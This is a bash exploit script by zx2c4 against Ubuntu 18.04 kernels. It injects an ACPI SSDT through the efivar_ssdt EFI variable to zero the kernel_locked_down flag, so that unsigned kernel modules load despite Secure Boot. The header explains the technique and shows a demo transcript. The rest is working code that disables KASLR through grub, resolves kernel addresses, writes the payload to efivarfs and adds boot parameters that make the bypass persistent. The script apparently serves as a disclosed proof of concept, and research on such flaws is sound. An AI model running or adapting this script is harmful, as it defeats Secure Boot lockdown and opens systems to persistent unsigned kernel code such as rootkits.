#!/bin/bash

# American Unsigned Language
# ==========================
# by zx2c4, 2020-06-13
#
# This exploit takes advantage of the efivar_ssdt entry point for injecting
# acpi tables into Ubuntu Bionic 18.04 kernels, where efivar_ssdt is not
# protected by kernel lockdown. The result is that one can subsequently load
# unsigned kernel drivers into systems with Secure Boot enabled, without
# needing to sign the modules.
#
# efivar_ssdt points to the name of an EFI variable, for which all GUID'd
# versions are enumerated, and then the contents are loaded as an ACPI table.
# In order for this to be useful we have to create an ASL file to be loaded,
# whose payload has the effect of writing zeros into the kernel_locked_down
# variable. Note that since we're accessing this via a physical address,
# neither various mitigations nor pagetable permissions restrict this. Plus,
# this method is generally executed during kernel init. In order to figure out
# a stable physical address that survives reboots, we just disable kaslr so
# that we can keep the same ssdt on all boots, making exploitation persistent.
#
# The \_SB_.GSIF._STA method is used, because SSDTs loaded this way cannot
# overwrite DSDT methods, but they can add new ones, and on the QEMU rig used
# to develop this, \_SB_.GSIF._STA was not defined, even though the kernel was
# evaluating it. Depending on your platform, you may wish to use a different
# method.
#
# Greetz to jono.
#
# Demo time:
#
# 1) First we show which kernel we're running:
#
# zx2c4@bionicman:~$ uname -a
# Linux bionicman 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
#
# 2) Observe that we can't load unsigned WireGuard:
#
# zx2c4@bionicman:~$ sudo modprobe wireguard
# modprobe: ERROR: could not insert 'wireguard': Required key not available
#
# 3) Run the exploit, whose first stage disables kaslr:
#
# zx2c4@bionicman:~$ ./american-unsigned-language.sh
# [+] Adding kernel cmdline variable to grub
# Sourcing file `/etc/default/grub'
# Generating grub configuration file ...
# Found linux image: /boot/vmlinuz-4.15.0-106-generic
# Found initrd image: /boot/initrd.img-4.15.0-106-generic
# Adding boot menu entry for EFI firmware configuration
# done
# [+] Reboot your computer, and then run this again.
# zx2c4@bionicman:~$ sudo reboot
#
# 4) After the computer reboots, we compute addresses and create an ssdt:
#
# zx2c4@bionicman:~$ ./american-unsigned-language.sh
# [+] Resolving kernel symbols
#  *  kernel_locked_down = 0xffffffff821c6c98
# [+] Mapping virtual address to physical address
#  *  kernel base = 0x1800000
#  *  kernel_locked_down = 0x29c6c98
# [+] Constructing ASL
# [+] Allocating GUID for ASL
#  *  guid = c5cffed4-e102-4ace-9a41-bb2811961602
# [+] Writing ASL to efivarfs
# [+] Adding kernel cmdline variable to grub
# Sourcing file `/etc/default/grub'
# Generating grub configuration file ...
# Found linux image: /boot/vmlinuz-4.15.0-106-generic
# Found initrd image: /boot/initrd.img-4.15.0-106-generic
# Adding boot menu entry for EFI firmware configuration
# done
# [+] Success. Reboot to activate.
# zx2c4@bionicman:~$ sudo reboot
#
# 5) After the computer reboots, we're now good to go, and kernel lockdown
#    is persistently disabled:
#
# zx2c4@bionicman:~$ sudo modprobe wireguard
# zx2c4@bionicman:~$ dmesg | grep WireGuard
# [   40.574623] wireguard: WireGuard 1.0.20200611 loaded. See www.wireguard.com for information.


set -e

SELF="$(readlink -f "${BASH_SOURCE[0]}")"
[[ $UID == 0 ]] || exec sudo -- "$BASH" -- "$SELF" "$@"

echo "=================================="
echo "=   American Unsigned Language   ="
echo "=            by zx2c4            ="
echo "=================================="

if [[ ! -d /boot/efi ]]; then
	echo "[+] Mounting /boot partition"
	mount /boot
fi

if [[ $(< /proc/cmdline) != *nokaslr* ]]; then
	if ! grep -F -q nokaslr /etc/default/grub; then
		echo "[+] Adding kernel cmdline variable to grub"
		echo 'GRUB_CMDLINE_LINUX_DEFAULT="$GRUB_CMDLINE_LINUX_DEFAULT nokaslr"' >> /etc/default/grub
		update-grub
	fi
	echo "[+] Reboot your computer, and then run this again."
	exit 0
fi

if ! command -v iasl >/dev/null 2>&1; then
	echo "[+] Installing dependencies"
	apt-get install -y acpica-tools
fi

echo "[+] Resolving kernel symbols"
read -r addr type symbol < <(grep -F kernel_locked_down /proc/kallsyms)
[[ $symbol == kernel_locked_down ]]
addr=$(( 0x$addr ))
printf ' *  kernel_locked_down = 0x%x\n' "$addr"

echo "[+] Mapping virtual address to physical address"
addr=$(( $addr & ~0xffffffff80000000 ))
while read -r line; do
	[[ $line =~ ([0-9a-f]+)-[0-9a-f]+\ :\ Kernel\ code ]] || continue
	offset=$(( 0x${BASH_REMATCH[1]} ))
	printf ' *  kernel base = 0x%x\n' "$offset"
	offset=$(( $offset - 0x01000000 ))
	addr=$(( $addr + $offset ))
	break
done < /proc/iomem
printf ' *  kernel_locked_down = 0x%x\n' "$addr"

echo "[+] Constructing ASL"
trap 'rm -f /root/trigger.aml /root/trigger.aml.efi' EXIT
iasl -p "/root/trigger" /dev/stdin > /dev/null <<-_EOF
	DefinitionBlock ("trigger.aml", "SSDT", 2, "", "", 0x00001001) {
	  OperationRegion (KMEM, SystemMemory, $(printf '0x%x' "$addr"), 4)
	  Field (KMEM, DWordAcc, NoLock, WriteAsZeros) {
	    LKDN, 32
	  }
	  Method (\_SB_.GSIF._STA) {
	    If (LKDN) {
	      LKDN = Zero
	    }
	    Return (Zero)
	  }
	}
_EOF
{ printf '\007\000\000\000'; cat /root/trigger.aml; } > /root/trigger.aml.efi

echo "[+] Allocating GUID for ASL"
guid=$(find "/sys/firmware/efi/efivars" -name "AmUnsignedLg-*" | head -n1 | cut -f2- -d-)
[[ -n "$guid" ]] || guid="$(< /proc/sys/kernel/random/uuid)"
echo " *  guid = $guid"

echo "[+] Writing ASL to efivarfs"
efivar="/sys/firmware/efi/efivars/AmUnsignedLg-$guid"
[[ -f $efivar ]] && chattr -i "$efivar"
dd if=/root/trigger.aml.efi of="$efivar" bs="$(stat -c %s /root/trigger.aml.efi)" status=none

if ! grep -F -q AmUnsignedLg /etc/default/grub; then
	echo "[+] Adding kernel cmdline variable to grub"
	echo 'GRUB_CMDLINE_LINUX_DEFAULT="$GRUB_CMDLINE_LINUX_DEFAULT efivar_ssdt=AmUnsignedLg"' >> /etc/default/grub
	update-grub
fi

echo "[+] Success. Reboot to activate."
